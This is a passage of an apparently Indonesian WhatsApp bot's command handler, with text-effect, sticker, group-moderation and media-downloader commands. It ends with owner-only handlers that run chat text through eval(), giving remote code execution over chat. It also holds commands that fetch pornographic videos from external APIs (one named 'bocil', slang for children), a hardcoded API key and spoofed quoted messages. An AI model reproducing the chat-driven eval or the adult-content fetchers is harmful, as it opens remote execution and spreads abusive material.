if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Example : ${prefix + command} 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`) 
reply(api.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
if (/stoneeffect/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
let anu = await textpro(link, q)
sock.sendMessage(m.chat, { image: { url: anu }, caption: `${api.success}` }, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await sock.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await sock.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
addCmd(command.slice(0), 1, commund)
break
case 'toimage': case 'toimg': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!m.quoted) return reply('Reply Sticker')
if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${prefix + command}*`)
reply(api.wait)
let media = await sock.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
sock.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
addCmd(command.slice(0), 1, commund)
break
case 'creategc': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!args.join(" ")) return reply(`Penggunaan ${prefix+command} namagroup`)
try {
let cret = await sock.groupCreate(args.join(" "), [])
let response = await sock.groupInviteCode(cret.id)
teks = `     「 Group Create Fitur 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

https://chat.whatsapp.com/${response}
       `
sock.sendMessage(m.chat, { text:teks, mentions: await sock.parseMention(teks)}, {quoted:m})
} catch {
reply("Error!")
}
}
addCmd(command.slice(0), 1, commund)
break
case 'setppbot': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await sock.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'panjang'`) {
var { img } = await generateProfilePicture(media)
await sock.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var memeg = await sock.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
}
addCmd(command.slice(0), 1, commund)
break
case 'getcase': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!args[0]) return reply("Mau ngambil case apa?")
try {
reply(`// 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./command/md.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
reply("Case Tidak Ditemukan")
}
}
addCmd(command.slice(0), 1, commund)
break
case 'join': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!text) return reply(`Link Nya Mana Kak?`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
reply(api.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await sock.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command.slice(0), 1, commund)
break
case 'out':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
sock.groupLeave(from)
}
addCmd(command.slice(0), 1, commund)
break
case 'public': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
sock.public = true
reply('Sukses Kak')
}
addCmd(command.slice(0), 1, commund)
break
case 'self': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
sock.public = false
reply('Sukses Kak')
}
addCmd(command.slice(0), 1, commund)
break
case 'ban': case 'block': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!args[0]) return reply(`Pilih add atau del`)
orgnye = m.mentionedJid[0] ? m.mentionedJid[0] : Number(args[1]) ? Number(args[1]) + "@s.whatsapp.net" : m.quoted ? m.quoted.sender : false
if (!orgnye) return reply(`Example : \n- ${prefix + command} del/add <number/tag/reply>\n- ${prefix + command} del 6287741097274`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('User sudah dibanned')
sock.updateBlockStatus(orgnye, 'block')
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('User tidak dibanned')
sock.updateBlockStatus(orgnye, 'unblock')
reply(`Succes delban`)
} else {
reply("Error")
}
}
addCmd(command.slice(0), 1, commund)
break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
try {
listBloxk = []
teskd = ``
listnyd = 1
for (let i of banUser) {
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `block del ${i.split("@")[0]}`, description: "ketuk untuk mengunblockir"})
}
teskd += `\n\nketuk button untuk mengunblockir`
const sections = [
{
title: "Total Blockir " + banUser.length,
rows: listBloxk
}
]

const listMessage = {
text: teskd,
footer: "_⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳_",
title: "     「 List Participants Blockir 」",
buttonText: "List Blockir",
mentions: await sock.parseMention(teskd),
sections
}
sock.sendMessage(from, listMessage, {quoted:m})
} catch {
reply("Tidak ada user yang diblockir")
}
}
addCmd(command.slice(0), 1, commund)
break
case 'add': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
sticWait(from)
if (!m.isGroup) return reply(api.group)
if (!isGroupAdmins && !isCreator) return reply(api.admin)
if (!isBotAdmins) throw SiGroupadmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sock.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command.slice(0), 1, commund)
break
case 'kick': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
sticWait(from)
if (!m.isGroup) return reply(api.group)
if (!isGroupAdmins && !isCreator) return reply(api.admin)
if (!isBotAdmins) throw SiGroupadmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sock.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command.slice(0), 1, commund)
break
case 'promote': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
var sticAdmin
if (!m.isGroup) return reply(api.group)
if (!isGroupAdmins && !isCreator) return reply(api.admin)
if (!isBotAdmins) throw SiGroupadmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sock.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command.slice(0), 1, commund)
break
case 'demote': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
var sticAdmin
if (!m.isGroup) return reply(api.group)
if (!isGroupAdmins && !isCreator) return reply(api.admin)
if (!isBotAdmins) throw SiGroupadmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sock.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
addCmd(command.slice(0), 1, commund)
break
case 'antionce': case 'antiviewonce':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!m.isGroup) return reply(api.group)
if (!isGroupAdmins && !isCreator) return reply(api.admin)
if (!isBotAdmins) throw SiGroupadmin(from)
if (args[0] === "on") {
if (global.db.chats[m.chat].antionce) return reply(`Sudah Aktif Sebelumnya`)
global.db.chats[m.chat].antionce = true
reply(`${command} Berhasil Di Aktifkan !`)
} else if (args[0] === "off") {
if (!global.db.chats[m.chat].antionce) return reply(`Sudah Nonaktif Sebelumnya`)
global.db.chats[m.chat].antionce = false
reply(`${command} Berhasil Di Nonaktifkan !`)
} else {
let buttonns = [
{ buttonId: '.antionce on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antionce off', buttonText: { displayText: 'Off' }, type: 1 }
]
await sock.sendButtonText(m.chat, buttonns, `Mode Antionce`, `_⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳_`, m)
}
addCmd(command.slice(0), 1, commund)
break
case 'antilink': {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
antilink.push(from)
m.reply('Succes menyalakan antilink di group ini ')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = antilink.indexOf(from)
antilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini ')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')

}
let buttons = [
{ buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await sock.sendButtonText(m.chat, buttons, `Mode Antilink`, `_ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳_`, m)
}
addCmd(command.slice(0), 1, commund)
break
case 'tagall': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!m.isGroup) return reply(api.group)
if (!q) return reply(`Teks?`)
let teks = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
sock.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
case 'hidetag': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!m.isGroup) return reply(api.group)
if (!isGroupAdmins && !isCreator) return reply(api.admin)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!q) return reply(`Teks?`)
sock.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
case 'listgc': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!m.isGroup) return reply(api.group)
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `     「 List Group Chat 」\n\nThere are ${anu.length} users using bot in group chat`
for (let i of anu) {
let metadata = await sock.groupMetadata(i)
if (metadata.owner === "undefined") {
loldd = false
} else {
loldd = metadata.owner
}
teks += `\n\nName : ${metadata.subject ? metadata.subject : "undefined"}\nOwner : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nDibuat : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMember : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
}
sock.sendTextWithMentions(m.chat, teks, m)
}
addCmd(command.slice(0), 1, commund)
break
case 'play':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
reply(api.wait)
let yts = require("yt-search")
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '6287741097274'
ngen = `
🕵️ Title : ${anu.title}
🥀 Ext : Search
🍁 ID : ${anu.videoId}
👀 Viewers : ${anu.views}
💌 Upload At : ${anu.ago}
🗣️ Author : ${anu.author.name}
🧑‍ Channel : ${anu.author.url}`
let buttonse = [
{buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
{buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
]
let buttonMessages = {
image: eek, 
jpegThumbnail: eek,
caption: ngen,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://chat.whatsapp.com/kepoanjing'
}}
}
sock.sendMessage(m.chat, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6287741097274-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: '☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
addCmd(command.slice(0), 1, commund)
break
case 'ytmp4': case 'ytvideo': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
let { ytv } = require('./command/Lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
sock.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP4\n✇ Resolusi : ${args[1] || '360p'}`, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://chat.whatsapp.com/kepoanjing'
}}}, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
case 'ytmp3': case 'ytaudio': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
let { yta } = require('./command/Lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
sock.sendImage(m.chat, media.thumb, `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP3\n✇ Resolusi : ${args[1] || '128kbps'}`, m)
sock.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt:true, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://chat.whatsapp.com/kepoanjing'
}}}, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
case 'tiktokmp3': { 
if (isBan) throw sticBanLu(from)
if (!text) throw '*Enter Link Tiktok!*'
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) throw '*The link you provided is not valid*'
let got = require('./command/Lib/tiktok.js')
got.tiktokDown(`${text}`).then(async (data) => {
sock.sendMessage(m.chat, { audio: { url: data.result.nowatermark }, mimetype: 'audio/mp4'}, { quoted: rik })
}).catch((err) => {
reply(`*Failed to download media and send audio*`)
})
 }
 break
 //=================================================//
case 'ttaudio':
case 'ttmusic':{
if (isBan) throw sticBanLu(from)
/*if (isLimit < 1) return reply("Limit kamu sudah habis , silahkan beli dengan cara #buy limit _jumlah_")
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(`Satu limit terpakai\nSisa limit kamu : ${global.db.data.users[m.sender].limit}`)*/
if (!q) return reply('Linknya?')
if (!q.includes('tiktok')) return reply('Itu bukan link tiktok!')
const musim_rambutan = await TiktokDownloader(`${q}`).catch(e => {
 m.reply(pesan.eror) 
} )
console.log(musim_rambutan)
const musim_duren_a = musim_rambutan.result.nowatermark
sock.sendMessage(from, { audio: { url: musim_duren_a }, mimetype: 'audio/mp4' }, { quoted: m })
}
 break
case 'tiktok': case 'tiktoknowm':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
reply(api.wait)
owned = '6287741097274'
mbc = `Nih Kak @${sender.split("@")[0]} `
let buttons = [
{buttonId: `${prefix}tiktokmp3 ${q}`, buttonText: {displayText: 'Audio'}, type: 1}
]
let buttonMessage = {
video: krt, 
jpegThumbnail: tytyd,
caption: mbc,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://chat.whatsapp.com/kepoanjing'
}}
}
sock.sendMessage(m.chat, buttonMessage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6287741097274-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: '☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
addCmd(command.slice(0), 1, commund)
break
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) throw sticBanLu(from)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)
reply('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) reply(stdout)
if (stderr.trim()) reply(stderr)
}
}
break
case 'tiktokaudio':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dedet = await cl.downloader.tiktok(`${q}`)
krt = (dedet.audio)
reply(`Nih Kak Downlod Sendiri
${krt}`)
addCmd(command.slice(0), 1, commund)
break
case 'quotesanime': case 'quoteanime': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
anuds = await quotesanime()
result = anuds[Math.floor(Math.random(), anuds.length)]
let buttons = [
{buttonId: `${prefix}quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
footerText: 'Press The Button Below',
buttons: buttons,
headerType: 2
}
sock.sendMessage(m.chat, buttonMessage, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
case 'hentai': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
sticWait(from)
reply(api.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
sock.sendMessage(m.chat, { video: { url: cejd.video_1 }, caption: `⭔ Title : ${cejd.title}\n⭔ Category : ${cejd.category}\n⭔ Mimetype : ${cejd.type}\n⭔ Views : ${cejd.views_count}\n⭔ Shares : ${cejd.share_count}\n⭔ Source : ${cejd.link}\n⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
case 'bokep': {
if (!isCreator) return reply(api.owner)
sticWait(from)
if (isBan) return reply(api.ban)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
sock.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
}
break
case 'asupan': case 'bocil': case 'rikagusriani':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
reply(api.wait)
fdy = await fetchJson(`https://kirbotz-api.herokuapp.com/api/random/asupan/${command}?apikey=${kirkey}`)
sock.sendMessage(from, { video : { url: fdy.result.url }}, { quoted: m })
}
addCmd(command.slice(0), 1, commund)
break
default:
}

if (budy.startsWith('=>')) {
if (!isCreator) return reply(api.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return reply(api.owner)
try {
let evaled = await eval(budy.slice(2))
